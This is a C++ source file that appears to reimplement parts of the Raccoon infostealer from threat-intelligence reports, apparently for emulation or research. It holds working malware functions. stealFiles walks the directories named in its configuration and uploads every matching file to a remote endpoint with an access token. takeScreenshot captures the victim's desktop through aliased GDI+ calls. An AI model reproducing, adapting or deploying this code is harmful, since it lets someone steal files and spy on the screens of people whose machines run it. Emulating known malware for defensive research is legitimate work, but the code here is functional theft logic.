#include "theft.h"


/**
* Loops over the supplied configuration lines (grbr_) to extract the requested path
* and filters, passing it to a parser before traversing the directory to exfil files
*
* Per CTI, all file exfils occur as files are found - they are not staged, hence a void return.
* There were very few details on how this was implemented in practice.
* 
* Sources:
* - Sekoia
* - AnyRun
* - CyberInt
*/
void stealFiles(vector<wstring> config) {

    for (int i = 0; i < config.size(); i++) {
        vector<wstring> tokens = parseGrabberConfigLineItems(config[i], g_pipe.c_str());
        vector<wstring> filters;
        vector<wstring> exclusions;
        vector<wstring> filePaths;
        vector<wstring> directories;
        int maxSize = 0;

        // Split the filter string
        if (wcscmp(tokens[FILTER].c_str(), g_dash.c_str()) != 0) {
            filters = parseGrabberConfigLineItems(tokens[FILTER], wstring(g_spaceChar + g_comma).c_str());
        }

        // Split the exclusion string
        if (wcscmp(tokens[EXCLUSIONS].c_str(), g_dash.c_str()) != 0) {
            exclusions = parseGrabberConfigLineItems(tokens[EXCLUSIONS], wstring(g_spaceChar + g_comma).c_str());
        }

        // Parse the file size
        if (wcscmp(tokens[MAX_FILE_SIZE].c_str(), g_dash.c_str()) != 0) {
            maxSize = _wtoi(tokens[MAX_FILE_SIZE].c_str());
        }

        filePaths = getPaths(tokens[PATH], filters, exclusions, _wtoi(tokens[MAX_FILE_SIZE].c_str()),
            _wtoi(tokens[RECURSE].c_str()), FILES);

        for (int i = 0; i < filePaths.size(); i++) {
            vector<char> fileBytes = readBytesFromFile(filePaths[i]);
            sendMultipartUpload(fileBytes, filePaths[i], g_token);
        }
    }
}

/**
* A default configuration for Raccoon takes a screenshot of the current desktop.
* This code is fairly close to the original, but a few details were missing that
* required some improvisation, mostly due to inexperience on our part.
* 
* Sources:
* - Sekoia
* - AnyRun
* 
*/
int takeScreenshot(wstring filename) {
    // Initialize GDI+
    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    g_racGdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    // Get the screen dimensions
    int width = g_racGetSystemMetrics(SM_CXSCREEN);
    int height = g_racGetSystemMetrics(SM_CYSCREEN);

    // Create a device context for the screen -- The first call gets
    // the device context for the desktop, the second sets up an in-memory
    // virtual device context where we can copy the data
    HDC hDesktop = g_racGetDC(NULL);
    HDC hMemoryDC = g_racCreateCompatibleDC(hDesktop);
    HBITMAP hMemoryBitmap = g_racCreateCompatibleBitmap(hDesktop, width, height);
    HGDIOBJ hOld = g_racSelectObject(hMemoryDC, hMemoryBitmap);

    // Copy the desktop to the in-memory memory device context
    g_racBitBlt(hMemoryDC, 0, 0, width, height, hDesktop, 0, 0, SRCCOPY);

    // Save the bitmap as a JPEG file
    // Needs to be in a new scope so that the bitmap can be cleaned up 
    // by the destructor (called when the GdiplusShutdown executes)
    {
        Gdiplus::Bitmap bitmap(hMemoryBitmap, NULL);
        CLSID encoderClsid;
        g_racCLSIDFromString(g_clsid.c_str(), &encoderClsid);
        bitmap.Save(filename.c_str(), &encoderClsid, NULL);
    }

    // Clean up
    g_racSelectObject(hMemoryDC, hOld);
    g_racDeleteObject(hMemoryBitmap);
    g_racDeleteDC(hMemoryDC);
    g_racReleaseDC(NULL, hDesktop);
    g_racGdiplusShutdown(gdiplusToken);

    return 0;
}